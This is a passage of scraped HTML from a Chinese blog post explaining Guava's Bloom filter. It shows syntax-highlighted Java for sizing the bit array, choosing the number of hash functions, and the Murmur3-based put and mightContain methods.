class=\"crayon-line\" id=\"crayon-5a6359b36cb3d815322548-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfBits</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">double</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb3d815322548-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb3d815322548-3\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Double</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MIN_VALUE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb3d815322548-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb3d815322548-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb3d815322548-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb3d815322548-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb3d815322548-8\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfHashFunctions</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb3d815322548-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// (m / n) * log(2), but avoid truncation due to division!</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb3d815322548-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">round</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">double</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb3d815322548-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n\n</div>\n<div title=\"Toggle Line Numbers\">接着再来看一下BloomFilterStrategies类，首先它是实现了BloomFilter.Strategy 接口的一个枚举类，其次它有两个2枚举值，MURMUR128_MITZ_32和MURMUR128_MITZ_64，分别对应了32位哈希映射函数，和64位哈希映射函数，后者使用了murmur3 hash生成的所有128位，具有更大的空间，不过原理是相通的，我们选择默认的MURMUR128_MITZ_64来分析：</div>\n<div title=\"Toggle Line Numbers\">\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb41316632597\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nMURMUR128_MITZ_64() {\r\n    &lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n    public &lt;T&gt; boolean put(\r\n        T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits) {\r\n      long bitSize = bits.bitSize();\r\n      byte[] bytes = Hashing.murmur3_128().hashObject(object, funnel).getBytesInternal();\r\n      long hash1 = lowerEight(bytes);\r\n      long hash2 = upperEight(bytes);\r\n\r\n      boolean bitsChanged = false;\r\n      long combinedHash = hash1;\r\n      for (int i = 0; i &lt; numHashFunctions; i++) {\r\n        // Make the combined hash positive and indexable\r\n        bitsChanged |= bits.set((combinedHash &amp; Long.MAX_VALUE) % bitSize);\r\n        combinedHash += hash2;\r\n      }\r\n      return bitsChanged;\r\n    }\r\n\r\n    @ Override\r\n    public &lt;T&gt; boolean mightContain(\r\n        T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits) {\r\n      long bitSize = bits.bitSize();\r\n      byte[] bytes = Hashing.murmur3_128().hashObject(object, funnel).getBytesInternal();\r\n      long hash1 = lowerEight(bytes);\r\n      long hash2 = upperEight(bytes);\r\n\r\n      long combinedHash = hash1;\r\n      for (int i = 0; i &lt; numHashFunctions; i++) {\r\n        // Make the combined hash positive and indexable\r\n        if (!bits.get((combinedHash &amp; Long.MAX_VALUE) % bitSize)) {\r\n          return false;\r\n        }\r\n        combinedHash += hash2;\r\n      }\r\n      return true;\r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb41316632597-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb41316632597-37\">37</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-1\"><span class=\"crayon-e\">MURMUR128_MITZ_64</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-n\">@Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-5\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-6\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBytesInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-7\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-8\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-10\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-11\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-12\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Make the combined hash positive and indexable</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-16\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-17\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-21\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-23\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-24\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBytesInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-25\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-26\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-28\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-29\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Make the combined hash positive and indexable</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-32\"><span class=\"crayon-h\">          </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-35\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb41316632597-36\"><span 